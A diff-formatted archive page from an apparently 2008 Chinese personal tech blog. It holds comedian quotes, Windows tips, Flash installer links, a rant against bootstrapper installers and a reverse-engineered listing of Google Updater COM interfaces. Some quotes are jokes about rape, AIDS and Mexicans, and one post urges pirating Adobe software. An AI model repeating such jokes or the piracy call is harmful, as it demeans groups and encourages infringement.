+<p><strong>88.</strong> The New England Journal of Medicine reports that 9 out of<br>
+
+10 doctors agree that 1 out of 10 doctors is an idiot.</p>
+
+<p><strong>Rodney Dangerfield Quotes</strong></p>
+
+<p><img height="263" src="http://www.sportsonline.com.au/images/Products/7108.jpg" width="196" align="left"></p>
+
+<p><strong>89.</strong> My father carries around the picture of the kid who came<br>
+
+with his wallet.</p>
+
+<p><strong>90.</strong> Oh, when I was a kid in show business I was poor. I used<br>
+
+to go to orgies to eat the grapes.</p>
+
+<p><strong>91.</strong> I’m at the age where I want two girls. In case I fall asleep<br>
+
+they will have someone to talk to.</p>
+
+<p><strong>92.</strong> A girl phoned me and said, “Come on over. There’s nobody<br>
+
+home.” I went over. Nobody was home!</p>
+
+<p><strong>93.</strong> Bisexuality immediately doubles your chances for a date<br>
+
+on Saturday night.</p>
+
+<p><strong><br>
+
+Sarah Silverman Quotes</strong></p>
+
+<p><img src="http://www.avclub.com/content/files/images/Sarah-Silverman.article.jpg" width="360" height="203"></p>
+
+<p><strong>94.</strong> When God gives you AIDS - and God does give you AIDS, by<br>
+
+the way - make lemonAIDS.</p>
+
+<p><strong>95.</strong> I was raped by a doctor. Which is, you know, so bittersweet<br>
+
+for a Jewish girl.</p>
+
+<p><strong>Chris Rock Quotes</strong><img height="200" src="http://img.timeinc.net/Life/img/070316/070316170031_rock2_250x355.jpg" width="150" align="left"></p>
+
+<p><strong>96.</strong> Every town has the same two malls: the one white people<br>
+
+go to and the one white people used to go to.</p>
+
+<p><strong>97.</strong> I live in a neighborhood so bad that you can get shot while<br>
+
+getting shot.</p>
+
+<p><strong>98.</strong> If a woman tells you she’s twenty and looks sixteen, she’s<br>
+
+twelve. If she tells you she’s twenty-six and looks twenty-six, she’s damn near<br>
+
+fourty.</p>
+
+<p><strong>99.</strong> “You know the world is going crazy when the best rapper<br>
+
+is a white guy, the best golfer is a black guy, the tallest guy in the NBA is Chinese,<br>
+
+the Swiss hold the America’s Cup, France is accusing the U.S. of arrogance, Germany<br>
+
+doesn’t want to<br>
+
+go to war, and the three most powerful men in America are named ‘Bush’, ‘Dick’,<br>
+
+and ‘Colon.’ Need I say more?”</p>
+
+<p><strong>100.</strong> “You won’t be able to take your eyes off the next four<br>
+
+presenters: Salma Hayek and Penelope Cruz.”<br>
+
+Chris Rock while hosting the Oscars</p>
+
+<p><strong>101.</strong> Gas is getting so expensive I’m gonna ride a mexican to<br>
+
+work.</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-01-09T14:49:56+08:00">2008-01-09</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/621360"  rel="bookmark" >
+              <h2 class="card-title">pkgmgr - Vista下命令行软件包管理工具</h2>
+            </a>
+            <p class="card-text"><p>vista默认安装没有telnet命令行工具：</p>
+
+<p>命令行执行：<code>start /w pkgmgr /iu:"TelnetClient"</code><br>
+
+或者</p>
+
+<p>Control Panel, Programs, and then Turn Windows Features on or off. In the list, scroll down and select Telnet Client. Click OK to start the installation.</p>
+
+<p>参考：<br>
+
+<a href="http://technet2.microsoft.com/WindowsVista/en/library/bc0c0afa-748d-4cdd-ab38-3868c3ca87151033.mspx?mfr=true">TechNet参考</a></p>
+
+<p><a href="http://technet2.microsoft.com/WindowsVista/en/library/77bd6146-1dae-4f3f-b172-4aa5fc876bdc1033.mspx?mfr=true">Vista包管理器概述</a></p>
+
+<p><a href="http://www.iis.net/articles/view.aspx/IIS7/Deploy-an-IIS7-Server/Installing-IIS7/Install-IIS7-from-the-Command-Line">用pkgmgr安装IIS7</a></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-01-07T15:19:32+08:00">2008-01-07</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/621358"  rel="bookmark" >
+              <h2 class="card-title">【图】当岁月逐渐腐蚀了我们的软件……</h2>
+            </a>
+            <p class="card-text"><p><img src='http://image.cache.yo2blog.com/wp-content/uploads/74/7487/2008/01/3.jpg' alt='3.jpg' width="600" height="1027"></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-01-07T15:11:46+08:00">2008-01-07</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/621336"  rel="bookmark" >
+              <h2 class="card-title">原来GMA950集成显卡也有性能提升的余地的</h2>
+            </a>
+            <p class="card-text"><p>好吧，我承认我火星。如果你是用的笔记本，显卡是Intel 945芯片集成的GMA 950的话，那么可以通过这个方式无损提升显卡性能50%以上：<br>
+
+首先安装好<a href="http://downloadcenter.intel.com/Product_Filter.aspx?ProductID=2301">最新的Intel显卡驱动</a><br>
+
+开始 运行 <code>igfxcfg</code><br>
+
+点击 显示设置 电源设置<br>
+
+拖到最高质量<br>
+
+<img src='http://image.cache.yo2blog.com/wp-content/uploads/74/7487/2008/01/11.jpg' alt='11.jpg' width="579" height="627"></p>
+
+<p>我是不是有点火星？？通过这个方法我成功的将CS 1.5的FPS从30提升到89，嘿嘿</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-01-06T18:11:36+08:00">2008-01-06</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/621334"  rel="bookmark" >
+              <h2 class="card-title">dbus-python for Windows</h2>
+            </a>
+            <p class="card-text"><pre>
+
+ActivePython 2.5.1.1 (ActiveState Software Inc.) based on
+
+Python 2.5.1 (r251:54863, May  1 2007, 17:47:05) [MSC v.1310 32 bit (Intel)] on
+
+win32
+
+Type "help", "copyright", "credits" or "license" for more information.
+
+&gt;&gt;&gt; import dbus
+
+&gt;&gt;&gt; dbus
+
+&lt;module 'dbus' from 'C:\Python25\lib\dbus\__init__.pyc'&gt;
+
+&gt;&gt;&gt;
+
+</pre>
+
+<p>成功！<br>
+
+把文件解压到 C:\Python25\lib\dbus\</p>
+
+<p><a href="http://dbus.freedesktop.org/">dbus</a>是个消息系统，dbus-python下载在<a href="http://dbus.freedesktop.org/releases/dbus-python/">这里</a>。里面的dbus-bindings不是我编译的，是一个老外编译好的 <a href="http://www.slurdge.org/comment/reply/42">http://www.slurdge.org/comment/reply/42</a></p>
+
+<p>下载：<a href='http://media.cache.yo2blog.com/wp-content/uploads/74/7487/2008/01/dbus.rar' title='dbus.rar'>dbus.rar</a></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-01-06T16:28:15+08:00">2008-01-06</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/621332"  rel="bookmark" >
+              <h2 class="card-title">直接下载Flash播放器控件离线完整版，9.0.115.0 支持X264视频</h2>
+            </a>
+            <p class="card-text"><p>Adobe收购Macromedia以后，做的东西越来越臃肿，下载越来越麻烦。</p>
+
+<p>这次装系统，Windows Server 2008，发现IE7浏览器没有自带Flash的ActiveX控件，于是去<a href="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash">官方下载</a>。</p>
+
+<p>没想到从Adobe这个JB网站下载下来的是一个 下载程序，这个巨垃圾的下载程序才会去真正的地址下载Flash控件然后安装。想天朝这种网速就别想安装成功了。</p>
+
+<p>所以必须找到真实的安装地址！<a href="http://fpdownload2.macromedia.com/get/flashplayer/current/gtb/install_flash.foo.s">http://fpdownload2.macromedia.com/get/flashplayer/current/gtb/install_flash.foo.s</a>。但是这个地址的文件被加密了，无法解开安装。</p>
+
+<p>该死的Adobe！！！</p>
+
+<p>经过多方搜索，得到了一个第三方授权下载的页面。有完整的安装包，是最新的9.0.115.0版本支持X264视频。数字签名是2007-11-21日。</p>
+
+<p>execute a <a href="http://www.adobe.com/licensing/distribution/">new<br>
+
+agreement</a>.</p>
+
+<ul class="link-list">
+
+<li><a target="mm_window" href="http://www.adobe.com/licensing/distribution/faq/"><br>
+
+Read the FAQ ›</a></li>
+
+<li><a target="mm_window" href="http://www.adobe.com/licensing/distribution/license/"><br>
+
+View the license ›</a></li>
+
+</ul>
+
+<h3>Downloads</h3>
+
+<h4>Flash Player 9</h4>
+
+<p><br></p>
+<p><br></p>
+<p><br></p>
+<p><br></p>
+<table class="max">
+
+<colgroup>
+
+<col class="datacolumns-4-aaBCD-aa"></colgroup>
+
+<col class="datacolumns-4-aaBCD-B">
+
+<col class="datacolumns-4-aaBCD-C">
+
+<col class="datacolumns-4-aaBCD-D">
+
+<tr>
+
+<th scope="col">Operating System</th>
+
+<th scope="col">Browsers</th>
+
+<th scope="col">Languages</th>
+
+<th scope="col">Installer</th>
+
+</tr>
+
+<tr>
+
+<td>Windows</td>
+
+<td>Internet Explorer</td>
+
+<td>All supported languages</td>
+
+<td>
+
+<ul class="iconmarker-16x16">
+
+<li><a href="http://www.adobe.com/go/full_flashplayer_win_ie"><br>
+
+<img alt="Download" src="http://www.adobe.com/images/icons/download.gif" width="16" height="16">Download<br>
+
+EXE Installer</a></li>
+
+<li><a s_oid="http://www.adobe.com/go/full_flashplayer_win_msi" s_oidt="0" href="http://www.adobe.com/go/full_flashplayer_win_msi"><br>
+
+<img alt="Download" src="http://www.adobe.com/images/icons/download.gif" width="16" height="16">Download<br>
+
+MSI Installer</a></li>
+
+<li><a href="http://www.adobe.com/go/full_flashplayer_win_msm"><br>
+
+<img alt="Download" src="http://www.adobe.com/images/icons/download.gif" width="16" height="16">Download<br>
+
+MSM Installer</a></li>
+
+<li><a href="http://www.adobe.com/licensing/distribution/strategies/sms.html"><br>
+
+<img alt="Information" src="http://www.adobe.com/images/icons/info.gif" width="16" height="16">Import<br>
+
+SMS Catalog</a> <span class="footnote"><a href="#sms">*</a></span></li>
+
+</ul>
+
+</td>
+
+</tr>
+
+<tr>
+
+<td>Windows</td>
+
+<td>Plugin-based browsers</td>
+
+<td>All supported languages</td>
+
+<td>
+
+<ul class="iconmarker-16x16">
+
+<li><a href="http://www.adobe.com/go/full_flashplayer_win"><br>
+
+<img alt="Download" src="http://www.adobe.com/images/icons/download.gif" width="16" height="16">Download<br>
+
+EXE Installer</a></li>
+
+<li><a href="http://www.adobe.com/go/full_flashplayer_win_pl_msi"><br>
+
+<img alt="Download" src="http://www.adobe.com/images/icons/download.gif" width="16" height="16">Download<br>
+
+MSI Installer</a></li>
+
+<li><a href="http://www.adobe.com/go/full_flashplayer_win_pl_msm"><br>
+
+<img alt="Download" src="http://www.adobe.com/images/icons/download.gif" width="16" height="16">Download<br>
+
+MSM Installer</a></li>
+
+</ul>
+
+</td>
+
+</tr>
+
+<tr>
+
+<td>Mac OS X<br>
+
+<span class="note">(Universal binary)</span></td>
+
+<td>All supported browsers</td>
+
+<td>All supported languages</td>
+
+<td>
+
+<ul class="iconmarker-16x16">
+
+<li><a href="http://www.adobe.com/go/full_flashplayer_macosx_ub"><br>
+
+<img alt="Download" src="http://www.adobe.com/images/icons/download.gif" width="16" height="16">Download<br>
+
+DMG Installer</a></li>
+
+</ul>
+
+</td>
+
+</tr>
+
+<tr>
+
+<td>Mac OS X<br>
+
+<span class="note">(PowerPC)</span></td>
+
+<td>All supported browsers</td>
+
+<td>All supported languages</td>
+
+<td>
+
+<ul class="iconmarker-16x16">
+
+<li><a href="http://www.adobe.com/go/full_flashplayer_macosx"><br>
+
+<img alt="Download" src="http://www.adobe.com/images/icons/download.gif" width="16" height="16">Download<br>
+
+DMG Installer</a></li>
+
+</ul>
+
+</td>
+
+</tr>
+
+<tr>
+
+<td>Linux</td>
+
+<td>All supported browsers</td>
+
+<td>All supported languages</td>
+
+<td>
+
+<ul class="iconmarker-16x16">
+
+<li><a href="http://www.adobe.com/go/fp9_linux_targz"><br>
+
+<img alt="Download" src="http://www.adobe.com/images/icons/download.gif" width="16" height="16">Download<br>
+
+GZIP Installer</a></li>
+
+<li><a href="http://www.adobe.com/go/fp9_linux_rpm"><br>
+
+<img alt="Download" src="http://www.adobe.com/images/icons/download.gif" width="16" height="16">Download<br>
+
+RPM Installer</a></li>
+
+</ul>
+
+</td>
+
+</tr>
+
+<tr>
+
+<td>Solaris (Sparc)</td>
+
+<td>All supported browsers</td>
+
+<td>All supported languages</td>
+
+<td>
+
+<ul class="iconmarker-16x16">
+
+<li><a href="http://www.adobe.com/go/fp9_solaris_sparc"><br>
+
+<img alt="Download" src="http://www.adobe.com/images/icons/download.gif" width="16" height="16">Download<br>
+
+GZIP Installer</a></li>
+
+</ul>
+
+</td>
+
+</tr>
+
+<tr>
+
+<td>Solaris (x86)</td>
+
+<td>All supported browsers</td>
+
+<td>All supported languages</td>
+
+<td>
+
+<ul class="iconmarker-16x16">
+
+<li><a href="http://www.adobe.com/go/fp9_solaris_x86"><br>
+
+<img alt="Download" src="http://www.adobe.com/images/icons/download.gif" width="16" height="16">Download<br>
+
+GZIP Installer</a></li>
+
+</ul>
+
+</td>
+
+</tr>
+
+</table>
+
+<p>See the<br>
+
+<a target="mm_window" href="http://www.adobe.com/software/flashplayer/productinfo/systemreqs/"><br>
+
+current Flash Player system requirements</a> for detailed information on<br>
+
+supported operating systems, browsers, and languages.</p>
+
+<p class="note" id="sms">* Customers using Microsoft Systems Management Server<br>
+
+(SMS) 2003 R2 can import the Flash Player Catalog for use with the Inventory<br>
+
+Tool for Custom Updates.</p>
+
+<h4>Flash Player 8</h4>
+
+<p>Flash Player 8 is no longer available from this licensing program. All<br>
+
+licensees should distribute Flash Player 9</p>
+
+<h4>Flash Player 7</h4>
+
+<p>Flash Player 9 is the most current version for Solaris. For licensees who<br>
+
+have not yet begun to distribute Flash Player 9 for Solaris, Flash Player 7 is<br>
+
+still available.</p>
+
+<p><br></p>
+<p><br></p>
+<p><br></p>
+<p><br></p>
+<table class="max">
+
+<colgroup>
+
+<col class="datacolumns-4-aaBCD-aa"></colgroup>
+
+<col class="datacolumns-4-aaBCD-B">
+
+<col class="datacolumns-4-aaBCD-C">
+
+<col class="datacolumns-4-aaBCD-D">
+
+<tr>
+
+<th scope="col">Operating System</th>
+
+<th scope="col">Browsers</th>
+
+<th scope="col">Languages</th>
+
+<th scope="col">Installer</th>
+
+</tr>
+
+<tr>
+
+<td>Solaris (Sparc)</td>
+
+<td>All supported browsers</td>
+
+<td>All supported languages</td>
+
+<td>
+
+<ul class="iconmarker-16x16">
+
+<li><a href="http://www.adobe.com/go/fp7_solaris_sparc"><br>
+
+<img alt="Download" src="http://www.adobe.com/images/icons/download.gif" width="16" height="16">Download<br>
+
+GZIP Installer</a></li>
+
+</ul>
+
+</td>
+
+</tr>
+
+<tr>
+
+<td>Solaris (x86)</td>
+
+<td>All supported browsers</td>
+
+<td>All supported languages</td>
+
+<td>
+
+<ul class="iconmarker-16x16">
+
+<li><a href="http://www.adobe.com/go/fp7_solaris_x86"><br>
+
+<img alt="Download" src="http://www.adobe.com/images/icons/download.gif" width="16" height="16">Download<br>
+
+GZIP Installer</a></li>
+
+</ul>
+
+</td>
+
+</tr>
+
+</table>
+
+<p>See the<br>
+
+<a target="mm_window" href="http://www.adobe.com/software/flashplayer/productinfo/systemreqs/flashplayer7/"><br>
+
+Flash Player 7 system requirements</a> for detailed information on supported<br>
+
+operating system, browsers, and languages.</p>
+
+<p class="note">Note: If you require a Player installer that is not available<br>
+
+from this page, please<br>
+
+<a href="http://www.adobe.com/cfusion/mmform/index.cfm?name=licensing">contact a<br>
+
+Player Licensing representative</a>.</p>
+
+<p>作为普通用户下载这个文件就行了<br>
+
+<a href="http://www.adobe.com/go/full_flashplayer_win_msi">http://www.adobe.com/go/full_flashplayer_win_msi</a></p>
+
+<p>像Adobe这种垃圾公司真应该被我们共&amp;产主义国家狠狠的盗版！！！</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-01-06T16:04:09+08:00">2008-01-06</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/621330"  rel="bookmark" >
+              <h2 class="card-title">I hate Bootstrapper!</h2>
+            </a>
+            <p class="card-text"><p>Downloading <a href="http://www.live.com/">Windows Live</a> components like Windows Live Writer, Windows Live Messenger is fucking slow!!<br>
+
+No matter wtf you <a href="http://get.live.com/WL/config_all">selected</a> to download, you always get a ’small’ executable <a href="http://g.live.com/1rewlive/en/WLInstaller.exe">http://g.live.com/1rewlive/en/WLInstaller.exe</a>, and this fucking bootstrapper will ’smartly’ download components background themself. I cannot select a proxy connection, or multi-theaded downloading using third-party tools. Bootstrapper inventors must have an ass in pain!!!!</p>
+
+<p>Sniffering the damned WLInstaller.exe I found out that the HTTP request was encrypted, I cannot get the direct download address!!!!! Shit!!!</p>
+
+<p>So does <a href="http://www.adobe.com/go/getflashplayer">dowloading</a> Adobe Flash Player OCX control !!<br>
+
+First you get a god-damn bootstrapper <a href="http://fpdownload.macromedia.com/get/flashplayer/current/ultrashim.cab">http://fpdownload.macromedia.com/get/flashplayer/current/ultrashim.cab</a><br>
+
+then you go to Macromedia site <a href="http://fpdownload2.macromedia.com/get/flashplayer/current/gtb/install_flash.foo.s">http://fpdownload2.macromedia.com/get/flashplayer/current/gtb/install_flash.foo.s</a>. God knows what to do with the fucking install_flash.foo.s. It’s neither a valid win32 PE binary nor a compressed package.</p>
+
+<p>Bootstrapper sucks!!!!!</p>
+
+<p>I don’t know what shit is Microsoft and Adobe developers are eating, I cannot download those BIG install files through proxy to bypass firewall, I cannot download with a dowload tool like <a href="http://www.orbitdownloader.com/">Orbit Downloader</a>. Why they just can’t provide a complete OFFLINE install package?</p>
+
+<p>Curse you all MS and Adobe !!!! Go To Hell!!!!</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-01-06T15:07:17+08:00">2008-01-06</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/621325"  rel="bookmark" >
+              <h2 class="card-title">Goodby Vista, hello Server 2008</h2>
+            </a>
+            <p class="card-text"><p>期末了，复习无聊，装了个Windows Server 2008。</p>
+
+<p>IE默认是高安全性设置，用按钮突破调整到了中</p>
+
+<p>安装桌面体验，打开Aero</p>
+
+<p>Firefox是自己做的portable版本，直接载入老系统的配置文件</p>
+
+<p>可惜Windows Server 2008不支持DrCom</p>
+
+<p><img src='http://image.cache.yo2blog.com/wp-content/uploads/74/7487/2008/01/1.jpg' width="600"></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-01-06T13:51:31+08:00">2008-01-06</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/621302"  rel="bookmark" >
+              <h2 class="card-title">007明日帝国里的火星键盘</h2>
+            </a>
+            <p class="card-text"><p>还是红色的，红色代表着鲜血和革命！！</p>
+
+<p><img src='http://image.cache.yo2blog.com/wp-content/uploads/74/7487/2008/01/1.JPG' alt='1.JPG' width="600" height="360"></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-01-05T15:51:52+08:00">2008-01-05</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/621274"  rel="bookmark" >
+              <h2 class="card-title">[分形]美丽的数学 - Fractal Art Contest 2007</h2>
+            </a>
+            <p class="card-text"><p><a href="http://www.fractalartcontests.com/">fractalartcontests.com</a>评出了<a href="http://www.fractalartcontests.com/2007/">2007</a>年度<a href="http://www.fractalartcontests.com/2007/winners.php">最美丽</a>的分形作品，数学和计算机图形学的完美结合！</p>
+
+<p><img src='http://image.cache.yo2blog.com/wp-content/uploads/74/7487/2008/01/z03w6yg0n0kwqapp320sa8vvha1.jpg'></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-01-05T08:27:49+08:00">2008-01-05</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/607017"  rel="bookmark" >
+              <h2 class="card-title">上氵每交——大内网泄露出来的"绝×密"文件</h2>
+            </a>
+            <p class="card-text"><p>还是贴成图片好</p>
+<p><img src='http://wpcache.yo2.cn/wp-content/uploads/74/7487/2007/12/1.bmp' alt='1.bmp'></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2007-12-24T01:17:57+08:00">2007-12-24</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/607014"  rel="bookmark" >
+              <h2 class="card-title">取消 web.config 的继承</h2>
+            </a>
+            <p class="card-text"><p>以往栋力无限的首页是 http://www.dormforce.net/homepage，一直很奇怪为什么不直接弄成 http://www.dormforce.net。今天才知道是根路径的 web.config “污染”了下级asp.net程序，所以跳转到一个单独的目录。</p>
+<p>网上搜索了下，可以取消web.config的集成，方法是在编辑最顶级web.config的XML文件，把&lt;/configSections&gt;后面的所有XML元素用<br>
+&lt;location path="." allowOverride="false" inheritInChildApplications="false"&gt;</p>
+<p>&lt;/location&gt;<br>
+括起来！</p>
+<p>注意，asp.net 1.1和asp.net 2.0不兼容！所以如果在全站asp.net 2.0跑一个 asp.net 1.1的二级路径程序，是不可能配置成功的！微软说这不是一个<a href="https://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=102118">bug</a>，这是一种“设计”，哈哈～～～</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2007-12-24T01:10:23+08:00">2007-12-24</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/605754"  rel="bookmark" >
+              <h2 class="card-title">[地球上最全面]Google Toolbar、Update、Google Gear接口</h2>
+            </a>
+            <p class="card-text"><p><code><br>
+UserBrokerLib; // UserBroker library</code></p>
+<p>Class UserBroker; // UserBroker coclass object<br>
+GUID={44295CB8-D71B-11DA-8750-001185653D78};<br>
+function RegCreateOrOpenKey(key_root:ULONG_PTR; key_path:BSTR; key_access:UI4; allow_create:I4; process_id:UI4; out key_handle:^ULONG_PTR): HResult;<br>
+function RegDeleteKey(key_root:ULONG_PTR; key_path:BSTR): HResult;<br>
+function CreatePath(path:BSTR): HResult;<br>
+function CreateFile(file_name:BSTR; desired_access:UI4; share_mode:UI4; creation_disposition:UI4; flags_attributes:UI4; process_id:UI4; out file_handle:^ULONG_PTR): HResult;<br>
+function DeleteFile(file_name:BSTR; even_if_in_use:I4): HResult;<br>
+function RemoveDirectory(path:BSTR): HResult;<br>
+function MoveFileEx(file_name:BSTR; new_name:BSTR; flags:UI4): HResult;<br>
+function CopyFile(file_name:BSTR; new_name:BSTR; fail_if_exists:I4): HResult;<br>
+function ApplyPatch(patch:BSTR; process_id:UI4; out thread_handle:^ULONG_PTR): HResult;<br>
+function FixMenus: HResult;<br>
+function SetDefaultSearchToGoogle: HResult;<br>
+function Uninstall: HResult;<br>
+function CleanVirtualizedPaths: HResult;<br>
+function EnableGoogleToolbar: HResult;<br>
+function VerifyGoogleSignature(key_res_id:I4; file_path:BSTR): HResult;<br>
+function ExecuteGoogleSignedExeElevated(exe:BSTR; args:BSTR; process_id:UI4; out process_handle:^ULONG_PTR): HResult;<br>
+function EnsureBrandingParameters: HResult;<br>
+function IsUpdaterServiceAvailable: HResult;</p>
+<p>Interface IUserBroker; // IUserBroker interface<br>
+GUID={45295CB8-D71B-11DA-8750-001185653D78};<br>
+function RegCreateOrOpenKey(key_root:ULONG_PTR; key_path:BSTR; key_access:UI4; allow_create:I4; process_id:UI4; out key_handle:^ULONG_PTR): HResult;<br>
+function RegDeleteKey(key_root:ULONG_PTR; key_path:BSTR): HResult;<br>
+function CreatePath(path:BSTR): HResult;<br>
+function CreateFile(file_name:BSTR; desired_access:UI4; share_mode:UI4; creation_disposition:UI4; flags_attributes:UI4; process_id:UI4; out file_handle:^ULONG_PTR): HResult;<br>
+function DeleteFile(file_name:BSTR; even_if_in_use:I4): HResult;<br>
+function RemoveDirectory(path:BSTR): HResult;<br>
+function MoveFileEx(file_name:BSTR; new_name:BSTR; flags:UI4): HResult;<br>
+function CopyFile(file_name:BSTR; new_name:BSTR; fail_if_exists:I4): HResult;<br>
+function ApplyPatch(patch:BSTR; process_id:UI4; out thread_handle:^ULONG_PTR): HResult;<br>
+function FixMenus: HResult;<br>
+function SetDefaultSearchToGoogle: HResult;<br>
+function Uninstall: HResult;<br>
+function CleanVirtualizedPaths: HResult;<br>
+function EnableGoogleToolbar: HResult;<br>
+function VerifyGoogleSignature(key_res_id:I4; file_path:BSTR): HResult;<br>
+function ExecuteGoogleSignedExeElevated(exe:BSTR; args:BSTR; process_id:UI4; out process_handle:^ULONG_PTR): HResult;<br>
+function EnsureBrandingParameters: HResult;<br>
+function IsUpdaterServiceAvailable: HResult;</p>
+<p>Alias ULONG_PTR;<br>
+UI4</p>
+<p>GUServiceLib; // Google Updater Service 1.0 Type Library</p>
+<p>Class GUServiceCtl; // GUServiceCtl Class<br>
+GUID={89DAE4CD-9F17-4980-902A-99BA84A8F5C8};<br>
+function Execute(file_name:LPWSTR; args:LPWSTR; caller_proc_id:UI4; out proc_handle:^ULONG_PTR): HResult;</p>
+<p>Interface ISilentUpdater; // Google Updater ISilentUpdater Interface<br>
+GUID={C07A89E4-82A3-4A29-9908-DFC9DEBF8267};<br>
+function Execute(file_name:LPWSTR; args:LPWSTR; caller_proc_id:UI4; out proc_handle:^ULONG_PTR): HResult;</p>
+<p>Alias ULONG_PTR;<br>
+UI4</p>
+<p>Class GUSchedulerCtl; // GUSchedulerCtl Class<br>
+GUID={B53B7061-6584-46AA-A033-D610EB10BD9B};<br>
+function RegisterEvent(app_id:LPWSTR; event_id:LPWSTR; file_name:LPWSTR; args:LPWSTR): HResult;<br>
+function UnregisterEvent(app_id:LPWSTR; event_id:LPWSTR): HResult;<br>
+function ScheduleEvent(app_id:LPWSTR; event_id:LPWSTR; interval:UI4): HResult;<br>
+function CancelEvent(app_id:LPWSTR; event_id:LPWSTR): HResult;<br>
+function ScheduleEventNow(app_id:LPWSTR; event_id:LPWSTR; caller_proc_id:UI4; out proc_handle:^ULONG_PTR): HResult;</p>
+<p>Interface IUpdaterScheduler; // Google Updater IUpdaterScheduler Interface<br>
+GUID={5C8CE0B5-6DA0-49A1-B675-78FD03EA3224};<br>
+function RegisterEvent(app_id:LPWSTR; event_id:LPWSTR; file_name:LPWSTR; args:LPWSTR): HResult;<br>
+function UnregisterEvent(app_id:LPWSTR; event_id:LPWSTR): HResult;<br>
+function ScheduleEvent(app_id:LPWSTR; event_id:LPWSTR; interval:UI4): HResult;<br>
+function CancelEvent(app_id:LPWSTR; event_id:LPWSTR): HResult;<br>
+function ScheduleEventNow(app_id:LPWSTR; event_id:LPWSTR; caller_proc_id:UI4; out proc_handle:^ULONG_PTR): HResult;</p>
+<p>GearsTypelib;</p>
+<p>Class BrowserHelperObject;<br>
+GUID={E0FEFE40-FBF9-42AE-BA58-794CA7E3FB53};<br>
+function QueryInterface(riid:^GUID; out ppvObj:^^void): HResult;<br>
+function AddRef: UI4;<br>
+function Release: UI4;</p>
+<p>Class HtmlDialogHost;<br>
+GUID={619C4FDA-4D52-4C7C-BAF2-5654DA16E675};<br>
+function QueryInterface(riid:^GUID; out ppvObj:^^void);<br>
+function AddRef: UI4;<br>
+function Release: UI4;<br>
+function GetTypeInfoCount(out pctinfo:^UINT);<br>
+function GetTypeInfo(itinfo:UINT; lcid:UI4; out pptinfo:^^void);<br>
+function GetIDsOfNames(riid:^GUID; rgszNames:^^I1; cNames:UINT; lcid:UI4; out rgdispid:^I4);<br>
+function Invoke(dispidMember:I4; riid:^GUID; lcid:UI4; wFlags:UI2; pdispparams:^DISPPARAMS; out pvarResult:^variant; out pexcepinfo:^EXCEPINFO; out puArgErr:^UINT);<br>
+function GetDialogArguments: BSTR;<br>
+function CloseDialog(result_string:BSTR);</p>
+<p>Dispatch HtmlDialogHostInterface;<br>
+GUID={5D437BB7-8634-46D2-AB33-F854034C73D6};<br>
+function QueryInterface(riid:^GUID; out ppvObj:^^void);<br>
+function AddRef: UI4;<br>
+function Release: UI4;<br>
+function GetTypeInfoCount(out pctinfo:^UINT);<br>
+function GetTypeInfo(itinfo:UINT; lcid:UI4; out pptinfo:^^void);<br>
+function GetIDsOfNames(riid:^GUID; rgszNames:^^I1; cNames:UINT; lcid:UI4; out rgdispid:^I4);<br>
+function Invoke(dispidMember:I4; riid:^GUID; lcid:UI4; wFlags:UI2; pdispparams:^DISPPARAMS; out pvarResult:^variant; out pexcepinfo:^EXCEPINFO; out puArgErr:^UINT);<br>
+function GetDialogArguments: BSTR;<br>
+function CloseDialog(result_string:BSTR);</p>
+<p>Class ToolsMenuItem;<br>
+GUID={0B4350D1-055F-47A3-B112-5F2F2B0D6F08};<br>
+function QueryInterface(riid:^GUID; out ppvObj:^^void): HResult;<br>
+function AddRef: UI4;<br>
+function Release: UI4;</p>
+<p>Class GearsFactory;<br>
+GUID={C93A7319-17B3-4504-87CD-03EFC6103E6E};<br>
+function QueryInterface(riid:^GUID; out ppvObj:^^void);<br>
+function AddRef: UI4;<br>
+function Release: UI4;<br>
+function GetTypeInfoCount(out pctinfo:^UINT);<br>
